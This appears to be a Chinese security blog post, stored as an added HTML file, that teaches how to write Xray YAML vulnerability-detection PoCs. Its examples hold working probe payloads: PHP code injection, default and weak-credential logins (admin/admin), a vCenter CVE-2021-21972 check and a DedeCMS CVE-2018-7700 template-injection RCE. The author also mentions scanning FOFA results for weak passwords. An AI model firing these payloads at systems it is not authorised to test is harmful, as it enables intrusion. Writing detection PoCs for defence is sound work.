@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Mr.Be1ieVe&#39;s Treasure">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg">
+    <meta property="twitter:image" content="https://mrbelieve.tech/img/home-bg-universe.jpg" />
+    
+
+    
+    <meta name="title" content="Xray_poc_编写学习" />
+    <meta property="og:title" content="Xray_poc_编写学习" />
+    <meta property="twitter:title" content="Xray_poc_编写学习" />
+    
+
+    
+    <meta name="description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。">
+    <meta property="og:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    <meta property="twitter:description" content="Mr.Be1ieVe，安全运营, 信息安全，生活家 | 这里是 Mr.Be1ieVe 的博客，与你一同学习进步。" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Mr.Be1ieVe">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Xray_poc_编写学习 | Mr.Be1ieVe的博客 | Mr.Be1ieVe&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/xray_poc_%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Mr.Be1ieVe&#39;s Treasure</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">个人原则宪法</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%AE%9E%E8%B7%B5">安全建设实践</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E6%80%9D%E8%80%83%E4%B8%8E%E5%88%86%E6%9E%90">底层原理思考与分析</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/top/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-universe.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                    </div>
+                    <h1>Xray_poc_编写学习</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    Mr.Be1ieVe&#39;s Treasure
+                             
+                            on 
+                            Tuesday, April 27, 2021
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h2 id="环境设置">环境设置</h2>
+<h3 id="在线自动生成">在线自动生成</h3>
+<p>直接访问 <a href="https://phith0n.github.io/xray-poc-generation/">https://phith0n.github.io/xray-poc-generation/</a>
+源仓库<a href="https://github.com/phith0n/xray-poc-generation">phith0n/xray-poc-generation: 🧬 辅助生成 XRay YAML POC</a></p>
+<h3 id="本地">本地</h3>
+<p>我使用vscode多，所以选择vsc的。
+
+  <img src="/img/Xray_poc_%e7%bc%96%e5%86%99%e5%ad%a6%e4%b9%a0/Snipaste_2021-04-28_23-43-47.png" alt="">
+
+</p>
+<p>安装后在这里点击
+
+  <img src="/img/Xray_poc_%e7%bc%96%e5%86%99%e5%ad%a6%e4%b9%a0/Snipaste_2021-04-28_23-45-07.png" alt="">
+
+</p>
+<p>然后改yaml.schemas为</p>
+<pre tabindex="0"><code>{
+    &#34;yaml.schemas&#34;: {
+        &#34;https://docs.xray.cool/assets/poc/yaml-poc-schema.json&#34;: &#34;poc-yaml-*.yml&#34;
+    }
+}
+</code></pre><p>这样在写<code>poc-yaml-{Your_file_name}.yml</code>时就会根据官方schema来提示了</p>
+<h2 id="基本结构">基本结构</h2>
+<pre tabindex="0"><code>name: poc-yaml-learning
+rules:
+  - method: GET
+    path: &#34;/&#34;
+    expression: |
+      response.status==200 &amp;&amp; body.bcontains(b&#39;learning Domain&#39;)
+</code></pre><p>整个 POC 是一个键值对，包含3个键：</p>
+<ul>
+<li><code>name: string</code>  名字</li>
+<li><code>set: []string</code> 定义变量，如随机数和反连平台等</li>
+<li><code>rules: []Rule</code> 规则列表</li>
+<li><code>detail: map[string]string</code> 内部存储需要返回给 xray 引擎的内容，如果无可忽略。</li>
+</ul>
+<p>Rule是poc的灵魂，yaml里一个rule是一个键值对，包含：</p>
+<ul>
+<li><code>method: string</code> 请求方法</li>
+<li><code>path: string</code> 请求的完整 Path，包括 querystring 等</li>
+<li><code>headers: map[string]string</code> 请求 HTTP 头，Rule 中指定的值会被覆盖到原始数据包的 HTTP 头中</li>
+<li><code>body: string</code> 请求的Body</li>
+<li><code>follow_redirects: bool</code> 是否允许跟随300跳转</li>
+<li><code>expression: string</code></li>
+<li><code>search: string</code></li>
+</ul>
+<h3 id="rule">Rule</h3>
+<p>根据这些键的作用，分为三类：</p>
+<ol>
+<li><code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>的作用是生成检测数据包</li>
+<li><code>expression</code> 的作用是判断该条 Rule 的结果</li>
+<li><code>search</code> 的作用是从返回包中提取信息</li>
+</ol>
+<h3 id="怎么写expression">怎么写expression</h3>
+<p>部分函数方法</p>
+<ul>
+<li><code>response.content_type.contains('application/octet-stream') &amp;&amp; response.body.bcontains(b'\x00\x01\x02')</code>
+<ul>
+<li>返回包的 content-type 包含 application/octet-stream，且 body 中包含 0x000102 这段二进制串</li>
+</ul>
+</li>
+<li><code>response.body.bcontains(b'test')</code></li>
+<li>返回包 body 包含 bytes 类型的 test，用bcontains方法</li>
+<li><code>r'^PK\x03\x04'.bmatches(response.body)</code></li>
+<li>body 匹配上正则<code>r'^PK\\x03\\x04</code>（文件头判断）</li>
+<li><code>response.status &gt;= 300 &amp;&amp; response.status &lt; 400</code>
+<ul>
+<li>返回包的 status code 在 300~400 之间</li>
+</ul>
+</li>
+<li><code>r'&lt;input value=&quot;(.+?)&quot;'.bmatches(response.body)</code></li>
+<li>Body包含表单</li>
+<li><code>response.headers['location']==&quot;https://www.example.com&quot;</code>
+<ul>
+<li>headers 中 <code>Location</code> 等于指定值，如果 <code>Location</code> 不存在，该表达式返回 false</li>
+</ul>
+</li>
+<li><code>'docker-distribution-api-version' in response.headers &amp;&amp; response.headers['docker-distribution-api-version'].contains('registry/2.0')</code>
+<ul>
+<li>headers 中包含 <code>docker-distribution-api-version</code> 并且 value 包含指定字符串，如果不判断 <code>in</code>，后续的 contains 会出错。</li>
+</ul>
+</li>
+<li><code>response.body.bcontains(bytes(response.url.path))</code></li>
+<li>body 中包含 url 的 path</li>
+</ul>
+<p>expression表达式返回的必须是一个bool类型的</p>
+<p>完整参考 <a href="https://docs.xray.cool/#/guide/poc?id=%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99expression%e8%a1%a8%e8%be%be%e5%bc%8f">官方简短说明</a> 或 [CEL表达式详细信息](<a href="https://github.com/google/cel-spec">https://github.com/google/cel-spec</a></p>
+<h3 id="怎么用search">怎么用search</h3>
+<p><strong>从返回包中提取信息</strong></p>
+<pre tabindex="0"><code>name: poc-yaml-example-com
+rules:
+  - method: GET
+    path: &#34;/update&#34;
+    expression: &#34;true&#34;
+    search: |
+      &lt;input type=&#34;hidden&#34; name=&#34;csrftoken&#34; value=&#34;(?P&lt;token&gt;.+?)&#34;
+  - method: POST
+    path: &#34;/update&#34;
+    body: |
+      id=&#39;;echo(md5(123));//&amp;csrftoken={{token}}
+    expression: |
+      status == 200 &amp;&amp; body.bcontains(b&#39;202cb962ac59075b964b07152d234b70&#39;)
+</code></pre><p><code>?P&lt;var&gt;</code> 是正则表达式命名组的语法，可在 <a href="https://regex101.com/r/VQndKy/1/">https://regex101.com/r/VQndKy/1/</a> 调试。<code>{{</code>、<code>}}</code>中包含的名字是正则的提取的数据，没提取成功就不会进行替换。</p>
+<h2 id="poc的执行过程">poc的执行过程</h2>
+<p>先对poc的关键，set和expression部分进行预编译和静态类型检查，然后有新的请求/链接时，根据rule对请求进行修改，替换掉原始数据包的数据，再获取对应请求的响应，匹配<code>expression</code>就进行下一个rule，全部rule执行完成后，表示有漏洞，并将detail的信息进行漏洞输出</p>
+<h2 id="示例">示例</h2>
+<p>官方仓库里经过漏洞镜像审核的poc <a href="https://github.com/chaitin/xray/tree/master/pocs">https://github.com/chaitin/xray/tree/master/pocs</a></p>
+<h3 id="自己小例子">自己小例子</h3>
+<p>之前整过python代码自动跑fofa搜出来的防火墙/路由器的弱口令，当时也基本是针对性的写的脚本，大概有50行，而现在粘贴路径，User-Agent，还要body，以及响应的判断即可</p>
+<pre tabindex="0"><code>name: poc-yaml-weekpasswd
+rules:
+  - method: POST
+    path: /userLogin.asp
+    headers:
+      User-Agent: &gt;-
+        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.49
+    body: &gt;-
+      save2Cookie=&amp;vldcode=&amp;account=admin&amp;password=admin&amp;btnSubmit=+%B5%C7%C2%BC+
+    follow_redirects: true
+    expression: |
+      response.status==200 &amp;&amp; body.contains(&#34;xx管理&#34;)
+</code></pre><p>随后在config里的plugin下，<code>local_poc: []</code> 加上自己poc的路径即可</p>
+<h3 id="社区poc">社区poc</h3>
+<p><a href="https://github.com/chaitin/xray/blob/master/pocs/kingsoft-v8-default-password.yml">源地址</a></p>
+<pre tabindex="0"><code>name: poc-yaml-kingsoft-v8-default-password
+rules:
+  - method: POST
+    path: /inter/ajax.php?cmd=get_user_login_cmd
+    body: &#34;{\&#34;get_user_login_cmd\&#34;:{\&#34;name\&#34;:\&#34;admin\&#34;,\&#34;password\&#34;:\&#34;21232f297a57a5a743894a0e4a801fc3\&#34;}}&#34;
+    follow_redirects: true
+    expression: |
+      response.status == 200 &amp;&amp; response.body.bcontains(b&#34;ADMIN&#34;) &amp;&amp; response.body.bcontains(b&#34;userSession&#34;)
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://idc.wanyunshuju.com/aqld/2123.html
+</code></pre><p><a href="https://github.com/chaitin/xray/blob/master/pocs/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml">xray/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml at master · chaitin/xray</a></p>
+<pre tabindex="0"><code>name: poc-yaml-vmware-vcenter-unauthorized-rce-cve-2021-21972
+rules:
+  - method: GET
+    path: /ui/vropspluginui/rest/services/uploadova
+    follow_redirects: false
+    expression: |
+      response.status == 405 &amp;&amp; response.body.bcontains(b&#34;Method Not Allowed&#34;)
+  - method: GET
+    path: /ui/vropspluginui/rest/services/getstatus
+    follow_redirects: false
+    expression: |
+      response.status == 200 &amp;&amp; response.body.bcontains(b&#34;States&#34;) &amp;&amp; response.body.bcontains(b&#34;Install Progress&#34;)
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://swarm.ptsecurity.com/unauth-rce-vmware/
+</code></pre><p><a href="https://github.com/chaitin/xray/blob/master/pocs/dedecms-cve-2018-7700-rce.yml">dedecms-cve-2018-7700-rce </a></p>
+<pre tabindex="0"><code>  
+name: poc-yaml-dedecms-cve-2018-7700-rce
+set:
+  r: randomInt(2000000000, 2100000000)
+rules:
+  - method: GET
+    path: &gt;-
+      /tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}echo%20md5{{r}};{/dede:field}
+    follow_redirects: true
+    expression: |
+      response.status == 200 &amp;&amp; response.body.bcontains(bytes(md5(string(r))))
+detail:
+  author: harris2015(https://github.com/harris2015)
+  Affected Version: &#34;V5.7SP2正式版(2018-01-09)&#34;
+  links:
+    - https://xz.aliyun.com/t/2224
+</code></pre><h2 id="最后">最后</h2>
+<p><a href="https://docs.xray.cool/#/guide/high_quality_poc">编写高质量poc - xray 安全评估工具文档</a> 可以反复观看学习比照</p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://mrbelieve.tech"><img src="/img/favicon.png" />Mr.Be1ieVe&#39;s Treasure</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/" data-toggle="tooltip" data-placement="top" title="安全产品学习">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/apt%E5%AD%A6%E4%B9%A0/" data-toggle="tooltip" data-placement="top" title="APT学习">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/awd" title="awd">
+                            awd
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/buu" title="buu">
+                            buu
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/hackthebox" title="hackthebox">
+                            hackthebox
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/linux%E4%BD%BF%E7%94%A8" title="linux使用">
+                            linux使用
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/xray" title="xray">
+                            xray
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0" title="专业学习">
+                            专业学习
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="基础知识">
+                            基础知识
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记">
+                            学习笔记
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:mr_believe@outlook.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/MrBe1ieVe">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="Mr.Be1ieVe&#39;s Treasure" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Mr.Be1ieVe&#39;s Treasure 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
